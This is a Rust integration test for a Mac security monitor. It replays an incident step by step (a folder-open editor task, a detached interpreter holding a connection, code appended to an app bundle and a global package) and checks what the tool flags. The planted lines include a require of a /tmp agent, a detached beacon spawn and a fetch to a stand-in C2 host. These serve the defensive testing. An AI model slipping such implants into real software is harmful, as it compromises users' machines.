struct Estate(PathBuf);

impl Estate {
    fn new() -> Estate {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let root =
            std::env::temp_dir().join(format!("soc-incident-{}-{nanos}", std::process::id()));
        for dir in ["home", "system", "empty"] {
            std::fs::create_dir_all(root.join(dir)).unwrap();
        }
        std::fs::write(root.join("brew.json"), "{\"formulae\": [], \"casks\": []}").unwrap();
        // A saved copy of the threat catalogue, so that the network is never asked.
        std::fs::write(root.join("kev.json"), CATALOGUE).unwrap();
        Estate(root)
    }

    fn home(&self) -> PathBuf {
        self.0.join("home")
    }

    fn system(&self) -> PathBuf {
        self.0.join("system")
    }

    fn store(&self) -> PathBuf {
        self.0.join("store.db")
    }

    /// A full run, as the app makes one every hour.
    fn run(&self) {
        let empty = self.0.join("empty");
        let out = Command::new(env!("CARGO_BIN_EXE_soc"))
            .env("HOME", self.home())
            .env("PATH", "/usr/bin:/bin")
            .current_dir(&self.0)
            .args(["run", "--machine-name", "mac", "--store"])
            .arg(self.store())
            .arg("--system-root")
            .arg(self.system())
            .arg("--brew-input")
            .arg(self.0.join("brew.json"))
            .args(["--tailscale", "none", "--threats-input"])
            .arg(self.0.join("kev.json"))
            .arg("--checkouts-root")
            .arg(self.home())
            .arg("--sessions-root")
            .arg(&empty)
            .arg("--servers-input")
            .arg(&empty)
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
    }

    /// What `soc status --json` answers.
    fn status(&self) -> serde_json::Value {
        let out = Command::new(env!("CARGO_BIN_EXE_soc"))
            .args(["status", "--json", "--store"])
            .arg(self.store())
            .output()
            .unwrap();
        let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
        v["result"].clone()
    }

    /// Everything that needs a look, in the status's order, as rule (or kind) and where.
    fn needs(&self) -> Vec<(String, String)> {
        self.status()["needs_a_look"]
            .as_array()
            .unwrap()
            .iter()
            .map(|i| {
                let rule = i["rule"].as_str().or(i["kind"].as_str()).unwrap();
                let place = i["where_text"].as_str().unwrap_or_default();
                (rule.to_string(), place.to_string())
            })
            .collect()
    }

    /// What the status names as having no reader, as what and which.
    fn not_read(&self) -> Vec<(String, String)> {
        self.status()["no_reader_for"]
            .as_array()
            .unwrap()
            .iter()
            .map(|n| {
                let s = |k: &str| n[k].as_str().unwrap_or_default().to_string();
                (s("what"), s("what_text"))
            })
            .collect()
    }
}

impl Drop for Estate {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

fn put(path: &Path, text: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
}

fn append(path: &Path, text: &str) {
    use std::io::Write;
    let mut f = std::fs::OpenOptions::new().append(true).open(path).unwrap();
    f.write_all(text.as_bytes()).unwrap();
}

fn sha256(path: &Path) -> String {
    let out = Command::new("/usr/bin/shasum")
        .args(["-a", "256"])
        .arg(path)
        .output()
        .unwrap();
    String::from_utf8(out.stdout).unwrap()[..64].to_string()
}

/// A checkout as git leaves it.
fn checkout(e: &Estate, rel: &str) -> PathBuf {
    let path = e.home().join(rel);
    put(&path.join(".git/HEAD"), "ref: refs/heads/main\n");
    path
}

// The estate before the incident.

fn estate_before_the_incident() -> Estate {
    let e = Estate::new();
    let api = checkout(&e, "dev/api");
    put(
        &api.join("Cargo.lock"),
        "version = 4\n\n[[package]]\nname = \"serde\"\nversion = \"1.0.210\"\n",
    );
    let site = checkout(&e, "dev/site");
    put(
        &site.join(".vscode/tasks.json"),
        "{\n  // build on demand\n  \"version\": \"2.0.0\",\n  \"tasks\": [{\"label\": \"build\", \"command\": \"make\"}]\n}\n",
    );
    application(&e);
    put(
        &e.home().join(format!(
            "Library/Application Support/{APP_ID}/modules/sync.js"
        )),
        "sync();\n",
    );
    let package = e.system().join(PACKAGE);
    put(
        &package.join("package.json"),
        "{\"name\": \"devtool\", \"version\": \"2.1.0\"}\n",
    );
    put(&package.join("lib/cli.js"), "run();\n");
    put(&e.system().join(KEG).join("bin/fmt-tool"), "#!/bin/sh\n");
    e
}

/// An application whose executable is a copy of `/usr/bin/true` and whose code is a script
/// in its resources, signed ad hoc as a developer's build would be.
fn application(e: &Estate) {
    let contents = e.system().join(APP).join("Contents");
    put(
        &contents.join("Info.plist"),
        &format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\"><dict>\n<key>CFBundleIdentifier</key><string>{APP_ID}</string>\n<key>CFBundleExecutable</key><string>Ledger</string>\n<key>CFBundlePackageType</key><string>APPL</string>\n<key>CFBundleShortVersionString</key><string>5.2</string>\n</dict></plist>\n"
        ),
    );
    std::fs::create_dir_all(contents.join("MacOS")).unwrap();
    std::fs::copy("/usr/bin/true", contents.join("MacOS/Ledger")).unwrap();
    put(&contents.join("Resources/app/main.js"), "start();\n");
    let out = Command::new("/usr/bin/codesign")
        .args(["--force", "--sign", "-"])
        .arg(e.system().join(APP))
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
}

// One helper per kind of planted change, in the incident's order.

/// Step 1: a project is cloned that carries the loader, an editor task that runs it when the
/// folder is opened, and the loader put in front of one of its package scripts.
fn clone_a_project_carrying_the_loader(e: &Estate) {
    let project = checkout(e, PROJECT);
    put(&project.join(".vscode/tasks.json"), TASK);
    put(&project.join(".vscode/loader.js"), LOADER);
    put(&project.join("package.json"), PACKAGE_JSON);
}

/// A process that stays after the test unless it is stopped; stopped when dropped.
struct Detached(Child);

impl Drop for Detached {
    fn drop(&mut self) {
        let _ = self.0.kill();
        let _ = self.0.wait();
    }
}

/// Step 2: the loader leaves an interpreter running inline code, detached from any terminal,
/// holding a connection open. The far end is a listener of the test's own on this Mac: it
/// stands for the incident's address, which no test may reach.
fn leave_a_detached_interpreter_holding_a_connection(listener: &TcpListener) -> Detached {
    let port = listener.local_addr().unwrap().port();
    let code = format!(
        "use IO::Socket::INET; my $s = IO::Socket::INET->new('127.0.0.1:{port}') or die; sleep 60;"
    );
    let child = Command::new("/usr/bin/perl")
        .args(["-e", &code])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .unwrap();
    listener.accept().unwrap();
    Detached(child)
}

/// Step 3: code added inside the application's bundle, after its developer signed it.
fn add_code_inside_the_application_bundle(e: &Estate) {
    append(
        &e.system().join(APP).join("Contents/Resources/app/main.js"),
        "require('../../../../../../tmp/.cache/agent.js');\n",
    );
}

/// Step 4: code added to what the application keeps outside its bundle.
fn add_code_to_the_application_outside_its_bundle(e: &Estate) {
    append(
        &e.home().join(format!(
            "Library/Application Support/{APP_ID}/modules/sync.js"
        )),
        "require('child_process').spawn('node', ['-e', 'beacon()'], {detached: true});\n",
    );
}

/// Step 5: code added to a global package, which runs whenever its command is used.
fn add_code_to_a_global_package(e: &Estate) {
    append(
        &e.system().join(PACKAGE).join("lib/cli.js"),
        "require('https').get('https://c2.ledger-sync.example/p');\n",
    );
}

/// Step 6: the incident's indicator list, as an analysis publishes it, given as a file next
/// to the store. Hashes of the task file and of the loader, the domain and the address.
fn give_the_incident_indicator_list(e: &Estate) {
    let project = e.home().join(PROJECT);
    let list = format!(
        r#"[
  {{"kind": "file:hashes.'SHA-256'", "value": "{}", "note_text": "editor task that starts the loader"}},
  {{"kind": "file:hashes.'SHA-256'", "value": "{}", "note_text": "loader"}},
  {{"kind": "domain-name:value", "value": "{C2_DOMAIN}", "note_text": "where the loader reports"}},
  {{"kind": "ipv4-addr:value", "value": "{C2_ADDRESS}", "note_text": "where the interpreter connects"}}
]"#,
        sha256(&project.join(".vscode/tasks.json")),
        sha256(&project.join(".vscode/loader.js")),
    );
    std::fs::write(e.0.join("indicators.json"), list).unwrap();
}

fn pair(rule: &str, place: &str) -> (String, String) {
    (rule.to_string(), place.to_string())
}

/// Asserts that what needs a look is exactly what was there plus this step's finding, and
/// returns the new whole.
fn exactly(
    e: &Estate,
    before: &[(String, String)],
    new: Option<(String, String)>,
) -> Vec<(String, String)> {
    let mut expected: Vec<_> = before.iter().cloned().chain(new).collect();
    expected.sort();
    let mut now = e.needs();
    now.sort();
    assert_eq!(now, expected);
    expected
}

fn names(e: &Estate, what: &str, which: &str) -> bool {
    e.not_read().contains(&pair(what, which))
}

const NOT_AGAINST: &str = "place indicators are not matched against";
const OTHER_WAY: &str = "way a project runs code by itself";

#[test]
fn the_incident_of_7_october_is_reported_step_by_step() {
    let e = estate_before_the_incident();
    let tasks = format!("~/{PROJECT}/.vscode/tasks.json");

    // Baseline: the estate as it was, nothing to look at.
    e.run();
    assert_eq!(e.needs(), []);
    let package_scripts = "package.json (scripts a package manager runs on install)";
    assert!(!names(&e, OTHER_WAY, package_scripts));

    // Step 1: the project with the loader and the task run on opening.
    clone_a_project_carrying_the_loader(&e);
    e.run();
    let seen = exactly(&e, &[], Some(pair("autorun.folder-open", &tasks)));
    // GAP: the loader put in front of a package script is not read. The status names
    // package.json scripts as a way a project runs code that has no reader. Closed by a
    // reader of package scripts (second pass).
    assert!(names(&e, OTHER_WAY, package_scripts));

    // Step 2: a detached interpreter holding a connection.
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let interpreter = leave_a_detached_interpreter_holding_a_connection(&listener);
    e.run();
    // GAP: processes and connections are not read yet, so nothing is found here. Closed by
    // samples of processes and connections and their two rules (first pass, item 4,
    // `src/processes.rs`); this step then expects its finding here. Until the indicator
    // list arrives no indicator names connections as not matched against (see step 6); the
    // status says it in `cannot_judge` instead.
    let seen = exactly(&e, &seen, None);
    // Silence here is not "nothing runs": the status says by name what it does not read.
    let processes = "processes and connections are not read by this build";
    assert!(
        e.status()["cannot_judge"]
            .as_array()
            .unwrap()
            .contains(&processes.into()),
        "{}",
        e.status()
    );
    drop(interpreter);

    // Step 3: code inside the application's bundle.
    add_code_inside_the_application_bundle(&e);
    e.run();
    let seen = exactly(
        &e,
        &seen,
        Some(pair("integrity.app-seal", &format!("/{APP}"))),
    );

    // Step 4: code the application keeps outside its bundle.
    add_code_to_the_application_outside_its_bundle(&e);
    e.run();
    let seen = exactly(
        &e,
        &seen,
        Some(pair(
            "integrity.app-code-outside",
            &format!("~/Library/Application Support/{APP_ID}"),
        )),
    );

    // Step 5: code in a global package.
    add_code_to_a_global_package(&e);
    e.run();
    let seen = exactly(
        &e,
        &seen,
        Some(pair("integrity.package-files", &format!("/{PACKAGE}"))),
    );

    // Step 6: the incident's indicator list is answered "affects me" with the place: the
    // task file's hash is that of a watched file.
    give_the_incident_indicator_list(&e);
    e.run();
    let seen = exactly(&e, &seen, Some(pair("indicator.match", &tasks)));
    // GAP: the loader's hash is not matched, since only watched files are; closed by
    // matching hashes against checkouts' files (second pass).
    assert!(names(
        &e,
        NOT_AGAINST,
        "file:hashes.'SHA-256' against files of checkouts and installed software other than watched files"
    ));
    // GAP: the domain and the address are not matched against connections; closed with
    // step 2's gap by `src/processes.rs`.
    assert!(names(
        &e,
        NOT_AGAINST,
        "domain-name:value against connections"
    ));
    assert!(names(
        &e,
        NOT_AGAINST,
        "ipv4-addr:value against connections"
    ));

    // A quiet run after it all: nothing new, nothing gone.
    e.run();
    exactly(&e, &seen, None);

    // The list as the owner sees it: every step that is caught, the most severe first.
    let status = e.status();
    let severities: Vec<usize> = status["needs_a_look"]
        .as_array()
        .unwrap()
        .iter()
        .map(|i| {
            ["informational", "low", "medium", "high", "critical"]
                .iter()
                .position(|s| *s == i["severity"])
                .unwrap()
        })
        .collect();
    assert!(
        severities.windows(2).all(|w| w[0] >= w[1]),
        "{severities:?}"
    );
    assert_eq!(status["needs_a_look_total"], 5);

    // The summary page names every one, with where it is.
    let out = Command::new(env!("CARGO_BIN_EXE_soc"))
        .args(["view", "--no-open", "--store"])
        .arg(e.store())
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let summary = String::from_utf8(out.stdout).unwrap();
    let page = std::fs::read_to_string(summary.lines().next().unwrap()).unwrap();
    for item in status["needs_a_look"].as_array().unwrap() {
        let id = item["id"].as_str().unwrap();
        let place = item["where_text"].as_str().unwrap();
        assert!(page.contains(&format!("id=\"{id}\"")), "{id}");
        assert!(page.contains(place), "{place}");
    }
}
